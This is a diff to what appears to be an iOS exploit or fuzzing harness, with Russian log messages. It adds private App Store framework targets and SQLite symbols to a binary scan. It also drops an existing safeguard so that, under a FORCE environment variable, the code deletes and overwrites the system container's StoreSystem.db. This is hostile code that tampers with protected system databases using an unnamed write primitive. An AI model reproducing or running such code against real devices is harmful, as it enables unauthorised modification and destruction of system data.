@@ -48544,11 +48544,12 @@ static void p_bq120(void) {
     LOG("[bq120] images: off=0x%x cnt=%u", imgOff, imgCnt);
 
     static const char *targets[] = {
+        "/System/Library/PrivateFrameworks/AppStoreUtilities.framework/AppStoreUtilities",
         "/System/Library/PrivateFrameworks/AppStoreDaemon.framework/AppStoreDaemon",
-        "/System/Library/PrivateFrameworks/AppStoreServices.framework/AppStoreServices",
     };
     static const char *needles[] = {
         "StoreSystem.db", "StoreUser.db", "CREATE TABLE", "ASUSQLite",
+        "BindFoundationValue", "CopyFoundationValue",
     };
     NSString *docs = NSSearchPathForDirectoriesInDomains(
         NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
@@ -48651,7 +48652,9 @@ static void p_bq121(void) {
         NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
 
     const char *dst = "/var/containers/Data/System/3E27999E-F441-4625-A423-AF11E87F71E8/Library/StoreSystem.db";
-    const char *srcp = [[docs stringByAppendingPathComponent:@"StoreSystem.db"]
+    const char *srcname = getenv("FUZZ_BQ121_SRC") ?: "StoreSystem.db";
+    const char *srcp = [[docs stringByAppendingPathComponent:
+                        [NSString stringWithUTF8String:srcname]]
                         fileSystemRepresentation];
 
     // --- снапшот ДО ---
@@ -48689,8 +48692,16 @@ static void p_bq121(void) {
 
     struct stat stx = {0};
     if (stat(dst, &stx) == 0) {
-        LOG("[bq121] ВНИМАНИЕ: StoreSystem.db уже существует (%lld байт) — НЕ трогаем, только отчёт", (long long)stx.st_size);
-        free(buf); bad_query_release(h); return;
+        if (!getenv("FUZZ_BQ121_FORCE")) {
+            LOG("[bq121] StoreSystem.db уже существует (%lld байт) — нужен FUZZ_BQ121_FORCE=1 для замены",
+                (long long)stx.st_size);
+            free(buf); bad_query_release(h); return;
+        }
+        if (unlink(dst) != 0) {
+            LOG("[bq121] unlink старого FAIL errno %d", errno);
+            free(buf); bad_query_release(h); return;
+        }
+        LOG("[bq121] старый (%lld байт) удалён (FORCE)", (long long)stx.st_size);
     }
 
     // --- пишем ---
